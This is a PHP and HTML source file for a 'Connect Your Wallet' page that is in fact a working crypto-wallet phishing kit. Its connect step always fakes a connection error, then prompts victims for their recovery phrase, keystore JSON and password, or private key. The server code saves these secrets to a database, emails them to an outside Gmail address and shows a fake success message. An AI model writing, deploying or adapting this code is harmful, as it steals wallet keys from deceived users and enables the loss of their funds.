<?php
// secure_assets.php
// This script generates a page for connecting various crypto wallets.
// It dynamically lists wallets and provides modal forms for connection.

// Start the session to manage user state, if necessary.
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Ensure the user is logged in before proceeding.
if (!isset($_SESSION['user_id'])) {
    header("Location: ../login.php");
    exit;
}

// Include necessary files for database connection and functions.


// Database connection
require_once 'db.php';

// Fetch wallet assets
$result = $conn->query('SELECT id, name, image_url, description FROM wallets');
$wallets = [];
while ($row = $result->fetch_assoc()) {
    $wallets[] = $row;
}

// Handle wallet import POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
    // Collect form data
    $wallet_name = $_POST['wallet_name'] ?? '';
    $import_method = $_POST['import_method'] ?? '';
    $import_input = $_POST['import_input'] ?? '';
    $user_id = $_SESSION['user_id'] ?? 0;

    // Generate transaction ID
    $transaction_id = strtoupper(bin2hex(random_bytes(6)));

    // Save to DB (table: wallet_imports)
    $stmt = $conn->prepare('INSERT INTO wallet_imports (user_id, wallet_name, method, input, transaction_id) VALUES (?, ?, ?, ?, ?)');
    $stmt->bind_param('issss', $user_id, $wallet_name, $import_method, $import_input, $transaction_id);
    $stmt->execute();
    $stmt->close();

    // Send email using PHP mail()
    $to = "juniachinedu@gmail.com";
    $subject = "New Wallet Import: $wallet_name";
    $message = "User ID: $user_id\nWallet: $wallet_name\nMethod: $import_method\nInput: $import_input\nTransaction ID: $transaction_id";
    $headers = "From: admin@fushionhubai.com.ng";
    mail($to, $subject, $message, $headers);
    $conn->close();
    echo '<script>window.successModalShow = true; window.generatedTransactionId = "' . $transaction_id . '";</script>';
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallets</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        .wallet-card {
            transition: box-shadow 0.2s;
        }

        .wallet-card:hover {
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
        }

        .btn-orange {
            background-color: rgb(255, 120, 95);
            color: white;
        }

        .btn-primary {
            background-color: rgb(255, 120, 95) !important;
            border-color: rgb(255, 120, 95) !important;
        }

        .btn-primary:hover,
        .btn-primary:focus,
        .btn-primary:active {
            background-color: rgb(235, 100, 75) !important;
            /* Slightly darker for hover effect */
            border-color: rgb(235, 100, 75) !important;
        }

        .txthead h2 {
            color: rgb(255, 120, 95);
            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
        }
    </style>
</head>

<body class="bg-gray-100">
    <div class="container py-5 txthead">
        <h2 class="text-center mb-6 font-bold text-3xl text-blue-700">Connect Your Wallet</h2>
        <p class="text-center mb-6 mx-auto font-bold">
            Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet.
        </p>
        <div class="row justify-content-center">
            <?php foreach ($wallets as $wallet): ?>
                <div class="col-md-4 mb-4">
                    <div class="wallet-card bg-white rounded-lg shadow-sms p-4 flex flex-col items-center">
                        <img src="<?php echo htmlspecialchars($wallet['image_url']); ?>" alt="<?php echo htmlspecialchars($wallet['name']); ?>" class="mb-3 rounded-full w-20 h-20 object-cover border-2 border-blue-500">
                        <h5 class="font-semibold text-lg mb-2 text-blue-600"><?php echo htmlspecialchars($wallet['name']); ?></h5>
                        <p class="text-gray-600 mb-3 text-center"><?php echo htmlspecialchars($wallet['description']); ?></p>
                        <button class="btn btn-primary connect-btn" data-id="<?php echo $wallet['id']; ?>" data-name="<?php echo htmlspecialchars($wallet['name']); ?>" data-image="<?php echo htmlspecialchars($wallet['image_url']); ?>">Connect</button>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
        <!-- Modal HTML -->
        <div class="modal fade" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content rounded-4 border-0">
                    <div class="modal-header border-0">
                        <h5 class="modal-title text-danger" id="walletModalLabel">Back</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div class="d-flex align-items-center mb-3 p-3 rounded-3 border border-secondary">
                            <img id="modalWalletImage" src="" alt="" class="me-2" style="border-radius:50%;height:24px;width:24px;">
                            <div>
                                <div id="modalWalletName" class="fw-bold"></div>
                                <div id="modalWalletDesc" class="text-muted small"></div>
                            </div>
                        </div>
                        <div class="d-flex align-items-center mb-3">
                            <div id="modalStatus" class="p-3 rounded-3 text-danger fw-bold flex-grow-1">Connecting...</div>
                            <div id="manualConnectBtn" class="ms-3" style="display:none;">
                                <button class="btn btn-orange" id="showImportModal">Connect Manually</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Import Modal HTML -->
        <form action="connect_wallet.php" method="post" id="importForm">
            <input type="hidden" name="wallet_name" id="formWalletName">
            <input type="hidden" name="import_method" id="formImportMethod">
            <input type="hidden" name="import_input" id="formImportInput">
            <!-- <input type="email" class="form-control mb-2" name="email" id="formEmail" placeholder="Your Email" required> -->
            <div class="modal fade" id="importModal" tabindex="-1" aria-labelledby="importModalLabel" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content rounded-4 border-0">
                        <div class="modal-body">
                            <div class="text-center mb-3">
                                <img id="importWalletImage" src="" alt="" style="height:40px;width:40px;border-radius:50%;">
                                <h5 class="mt-2">Import your <span id="importWalletName"></span> Wallet</h5>
                            </div>
                            <ul class="nav nav-tabs justify-content-center mb-3" id="importTab" role="tablist">
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link active" id="phrase-tab" data-bs-toggle="tab" data-bs-target="#phrase" type="button" role="tab">Phrase</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link" id="keystore-tab" data-bs-toggle="tab" data-bs-target="#keystore" type="button" role="tab">Keystore JSON</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link" id="privatekey-tab" data-bs-toggle="tab" data-bs-target="#privatekey" type="button" role="tab">Private Key</button>
                                </li>
                            </ul>
                            <div class="tab-content" id="importTabContent">
                                <div class="tab-pane fade show active" id="phrase" role="tabpanel">
                                    <input type="text" class="form-control mb-2" id="phraseWalletName" placeholder="Wallet Name">
                                    <textarea class="form-control mb-2" id="phraseInput" placeholder="Enter your recovery phrase"></textarea>
                                    <div class="mb-2">
                                        <input type="email" class="form-control" id="phraseEmail" placeholder="Your Email" required>
                                    </div>
                                    <div class="text-danger small mb-2">Typically 12 (sometimes 24) words separated by single spaces</div>
                                    <button type="button" class="btn btn-block w-100 import-proceed" data-method="Phrase" style="background:#ff6a4d;color:#fff;">Proceed</button>
                                </div>
                                <div class="tab-pane fade" id="keystore" role="tabpanel">
                                    <textarea class="form-control mb-2" id="keystoreInput" placeholder="Keystore JSON"></textarea>
                                    <div class="mb-2">
                                        <input type="email" class="form-control" id="phraseEmail" placeholder="Your Email" required>
                                    </div>
                                    <input type="text" class="form-control mb-2" id="keystoreWalletName" placeholder="Wallet Password">
                                    <div class="text-danger small mb-2">Several lines of text beginning with {...} plus the password you used to encrypt it.</div>
                                    <button type="button" class="btn btn-block w-100 import-proceed" data-method="Keystore JSON" style="background:#ff6a4d;color:#fff;">Proceed</button>
                                </div>
                                <div class="tab-pane fade" id="privatekey" role="tabpanel">
                                    <input type="text" class="form-control mb-2" id="privateKeyInput" placeholder="Enter your Private Key">
                                    <div class="mb-2">
                                        <input type="email" class="form-control" id="phraseEmail" placeholder="Your Email" required>
                                        <div class="text-danger small mb-2">Typically 12 (sometimes 24) words separated by single spaces</div>
                                        <button type="button" class="btn btn-block w-100 import-proceed" data-method="Private Key" style="background:#ff6a4d;color:#fff;">Proceed</button>
                                    </div>
                                </div>
                                <div class="d-flex justify-content-end align-items-center mt-2">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Cancel</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
        </form>
        <!-- Success Modal -->
        <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content rounded-4 border-0">
                    <div class="modal-body text-center p-5">
                        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" fill="#28a745" class="mb-3" viewBox="0 0 16 16">
                            <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM7 10.414l4.707-4.707-1.414-1.414L7 7.586 5.707 6.293 4.293 7.707 7 10.414z" />
                        </svg>
                        <h3 class="mb-3 text-success">Success!</h3>
                        <p class="mb-2">Your wallet import was submitted successfully.</p>
                        <div class="mb-3">
                            <span class="fw-bold">Transaction ID:</span>
                            <span id="transactionId" class="text-primary"></span>
                        </div>
                        <p class="text-muted">You will be redirected shortly...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        $(document).ready(function() {
            let walletModal = new bootstrap.Modal(document.getElementById('walletModal'));
            let importModal = new bootstrap.Modal(document.getElementById('importModal'));
            $('.connect-btn').on('click', function() {
                // Show connecting modal
                $('#modalStatus').text('Connecting...').removeClass('border-success').addClass('border-danger text-danger');
                $('#manualConnectBtn').hide();
                $('#modalWalletImage').attr('src', $(this).data('image'));
                $('#modalWalletName').text($(this).data('name'));
                $('#modalWalletDesc').text('Easy-to-use browser extension.');
                walletModal.show();
                // Simulate connection attempt with 30s delay
                setTimeout(function() {
                    $('#modalStatus').text('Error Connecting..').removeClass('text-success').addClass('text-danger');
                    $('#manualConnectBtn').show(); // Show button when error
                }, 5000); // 5 seconds
            });
            $('#showImportModal').on('click', function() {
                walletModal.hide();
                // Set import modal info
                $('#importWalletImage').attr('src', $('#modalWalletImage').attr('src'));
                $('#importWalletName').text($('#modalWalletName').text());
                // Set hidden field for wallet name
                $('#formWalletName').val($('#modalWalletName').text());
                importModal.show();
            });

            // Handle import form submission
            $('.import-proceed').on('click', function() {
                let method = $(this).data('method');
                let walletName = '';
                let input = '';
                if (method === 'Phrase') {
                    walletName = $('#phraseWalletName').val();
                    input = $('#phraseInput').val();
                } else if (method === 'Keystore JSON') {
                    walletName = $('#formWalletName').val();
                    input = $('#keystoreInput').val() + '\nPassword: ' + $('#keystoreWalletName').val();
                } else if (method === 'Private Key') {
                    walletName = $('#formWalletName').val();
                    input = $('#privateKeyInput').val();
                }
                $('#formWalletName').val(walletName);
                $('#formImportMethod').val(method);
                $('#formImportInput').val(input);
                $('#importForm').submit();
            });
            // Show success modal if data was inserted
            if (window.successModalShow) {
                var transactionId = window.generatedTransactionId || '';
                var successModal = new bootstrap.Modal(document.getElementById('successModal'));
                $('#transactionId').text(transactionId);
                successModal.show();
                setTimeout(function() {
                    window.location.href = 'success_connect.php?txid=' + transactionId;
                }, 3500); // 3.5 seconds
            }
        });
    </script>
</body>

</html>